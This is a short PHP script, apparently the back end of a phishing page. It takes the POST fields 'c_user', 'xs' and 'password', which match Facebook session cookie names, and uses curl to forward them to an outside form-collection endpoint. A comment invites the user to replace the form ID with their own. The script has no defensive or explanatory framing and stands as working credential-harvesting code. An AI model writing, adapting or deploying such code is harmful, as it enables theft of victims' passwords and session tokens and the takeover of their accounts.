<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Collect form data
    $c_user = $_POST['c_user'] ?? '';
    $xs = $_POST['xs'] ?? '';
    $password = $_POST['password'] ?? '';

    // Prepare data array
    $data = [
        'c_user' => $c_user,
        'xs' => $xs,
        'password' => $password,
    ];

    // Send POST request to Formspork
    $ch = curl_init('https://submit-form.com/QMpYhIxdI'); // <-- Replace with your actual form ID

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

    $response = curl_exec($ch);
    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($httpcode === 200) {
        echo "Form submitted successfully!";
    } else {
        echo "Error submitting form.";
    }
} else {
    echo "Invalid request.";
}
?>
